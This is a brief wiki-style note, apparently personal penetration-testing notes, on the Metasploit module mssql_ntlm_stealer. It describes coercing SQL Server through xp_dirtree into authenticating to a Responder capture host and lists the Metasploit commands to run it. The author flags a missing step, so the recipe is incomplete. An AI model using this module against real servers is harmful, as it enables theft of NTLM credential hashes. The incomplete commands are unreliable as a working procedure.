<!-- TITLE: Mssqlntlmstealer -->
<!-- SUBTITLE: A quick summary of Mssqlntlmstealer -->

Looks like it uses SQL server creds to induce SQL to connect to rpc (responder / capture)

Requires: SQL creds, and xp_dirtree to be enabled.
# How to call
```
use admin/mssql/mssql_ntlm_stealer
set PASSWORD <previouslyknown>
set USERNAME <previouslyknown>
set RHOSTS <target>
<pretty sure something is missing here, how does sql server know to target the reponder? Look in metasploit someday>
run
```

